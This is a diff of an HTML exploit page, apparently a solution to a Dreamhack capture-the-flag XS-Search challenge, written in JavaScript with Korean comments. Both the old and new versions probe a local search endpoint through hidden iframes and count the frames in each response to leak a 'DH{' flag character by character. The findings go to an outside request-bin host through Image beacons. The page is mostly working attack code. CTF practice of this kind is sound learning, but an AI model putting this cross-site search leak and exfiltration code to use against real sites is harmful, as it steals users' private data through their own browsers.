@@ -8,62 +8,53 @@
 <body>
     <h1>XS-Search Site</h1>
 
-        <script>
-            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+<iframe id="iframe" style="display:none;"></iframe>
+<script>
+    const iframe = document.getElementById("iframe");
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+    let flag = "DH{";
 
-            async function search(query) {
-                return new Promise((resolve) => {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
+    async function searchChar(data) {
+        return new Promise((resolve) => {
+            // 봇의 3초 제한 때문에 응답이 없으면 0.2초 후 다음 글자로 넘김
+            const timer = setTimeout(() => resolve(false), 200);
 
-                    ifr.onload = () => {
-                        const found = ifr.contentWindow.frames.length > 0;
-                        document.body.removeChild(ifr);
-                        resolve(found);
-                    }
+            iframe.onload = () => {
+                clearTimeout(timer);
+                // 블로그의 정답 로직: 하위 프레임 개수 확인
+                const isFound = iframe.contentWindow.frames.length > 0;
+                resolve(isFound);
+            };
+            // 쿼리 전송
+            iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
+        });
+    }
 
-                    setTimeout(() => {
-                        if (document.body.contains(ifr)) {
-                            document.body.removeChild(ifr);
-                            resolve(false);
-                        }
-                    }, 100);
-                });
-            }
+    async function findFlag() {
+        // 접속 확인 신호
+        new Image().src = "https://jkgnhat.request.dreamhack.games?start=started";
 
-            async function exploit() {
-                new Image().src = `https://jkgnhat.request.dreamhack.games?start=started`;
-
-                let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
-                let secret = "DH{";
-                let secret_length = 40;
-
-                for (let i = 3; i < secret_length; i++) {
-                    let foundAny = false;
-
-                    for (let c of chars) {
-                        const result = await search(secret + c);
-
-                        if (result) {
-                            secret += c;
-                            new Image().src= `https://jkgnhat.request.dreamhack.games?found=${encodeURIComponent(secret)}`;
-                            console.log(`Found: ${secret}`);
-                            foundAny = true;
-
-                            if (c === "}") return;
-                            break;
-                        }
-                    }
-
-                    if (!foundAny) {
-                        new Image().src = `https://jkgnhat.request.dreamhack.games?error=No`;
-                    }
+        // 봇의 짧은 생존 시간 동안 최대한 많이 시도
+        for (let i = 0; i < 35; i++) {
+            let found = false;
+            for (let c of chars) {
+                if (await searchChar(flag + c)) {
+                    flag += c;
+                    // 찾자마자 즉시 전송
+                    new Image().src = "https://jkgnhat.request.dreamhack.games?flag=" + encodeURIComponent(flag);
+                    found = true;
+                    if (c === "}") return;
+                    break;
                 }
             }
+            if (!found) {
+                new Image().src = "https://jkgnhat.request.dreamhack.games?error=notfound";
+                break;
+            }
+        }
+    }
 
-            exploit();
-    </script>
+    findFlag();
+</script>
 </body>
 </html>
